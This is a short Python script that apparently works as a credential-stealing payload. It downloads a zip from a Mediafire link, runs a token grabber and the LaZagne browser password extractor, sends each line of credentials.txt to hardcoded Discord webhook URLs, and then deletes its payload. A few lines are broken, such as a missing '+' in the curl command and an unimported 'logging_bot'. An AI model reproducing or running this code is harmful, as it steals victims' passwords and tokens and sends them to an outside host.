from time import sleep
import os
from discord_webhook import *
import urllib
import send_passwords
from logging_bot import log

logging_bot.log("started send_passwords.py")

download_link = "https://download1655.mediafire.com/ve9ey3rh72ag/t8vr5soxiv5ozvf/payload1.zip"
webhook_url = "https://discordapp.com/api/webhooks/924328384492871700/0ZgV8H7BxLh9IUV2HGDHWLG842gFo_XmF3yhta1iXBR8hJ1kwh4Tif_NpCQf_hJtIoOM"
# Pauls webhook #webhook_url = "https://discord.com/api/webhooks/923283787784261703/HaSpko88NVDvndZj2XZPcVNSrP5Pj5dsroyvrGwrJfQPeytewR-eDlNUOM_OtOG6LvU1"
#

"""def Download(link, filename): 
    urllib.urlretrieve(link, filename)"""

def Download(link, filename):
    os.system("curl " + link " --output " + filename)

def del_all():
    os.system("cd .. ")
    os.system("del payload1")

def send_passwords():
    f = open("credentials.txt", "r")
    logging_bot.log("sending passwords")
    for word in f:
        sleep(0.01)
        content = word
        webhook = DiscordWebhook(url=webhook_url, username="Password Send Bot", content=content, avatar_url="https://cdn-icons-png.flaticon.com/512/37/37362.png")
        response = webhook.execute()

log("run token grabber")
os.system("python3 token_grabber_2021.py") # run token grabber
log("run laZagne")
os.system("python3 laZagne_win.py") # run laZagne password (browser) extracter
log("sending passwords")
send_passwords.send_passwords() # use function from send_passwords.py

del_all()
